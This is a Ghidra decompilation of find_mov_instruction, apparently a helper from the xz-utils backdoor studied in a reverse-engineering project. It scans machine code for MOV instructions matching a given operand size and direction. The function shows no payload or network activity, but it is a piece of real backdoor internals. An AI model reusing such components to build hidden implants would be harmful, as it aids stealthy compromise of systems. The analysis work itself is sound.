// /home/kali/xzre-ghidra/xzregh/100E00_find_mov_instruction.c
// Function: find_mov_instruction @ 0x100E00
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_mov_instruction(u8 * code_start, u8 * code_end, BOOL is_64bit_operand, BOOL load_flag, dasm_ctx_t * dctx)


BOOL find_mov_instruction
               (u8 *code_start,u8 *code_end,BOOL is_64bit_operand,BOOL load_flag,dasm_ctx_t *dctx)

{
  int iVar1;
  BOOL BVar2;
  long lVar3;
  undefined4 *puVar4;
  bool bVar5;
  undefined4 local_80 [22];
  
  puVar4 = local_80;
  for (lVar3 = 0x16; lVar3 != 0; lVar3 = lVar3 + -1) {
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  if (dctx == (dasm_ctx_t *)0x0) {
    dctx = (dasm_ctx_t *)local_80;
  }
  do {
    while( true ) {
      if (code_end <= code_start) {
        return 0;
      }
      BVar2 = x86_dasm(dctx,code_start,code_end);
      if (BVar2 != 0) break;
      code_start = code_start + 1;
    }
    if ((((dctx->field2_0x10).field0.field11_0xc.modrm_word & 0xff00ff00) == 0x5000000) &&
       (((uint)(((dctx->field2_0x10).field0.field10_0xb.rex_byte & 0x48) == 0x48) ==
         is_64bit_operand || (load_flag == 0)))) {
      iVar1._0_1_ = dctx->_unknown810[0];
      iVar1._1_1_ = dctx->_unknown810[1];
      iVar1._2_1_ = dctx->_unknown810[2];
      iVar1._3_1_ = dctx->field_0x2b;
      if (load_flag == 0) {
        bVar5 = iVar1 == 0x109;
      }
      else {
        bVar5 = iVar1 == 0x10b;
      }
      if (bVar5) {
        return 1;
      }
    }
    code_start = code_start + dctx->instruction_size;
  } while( true );
}

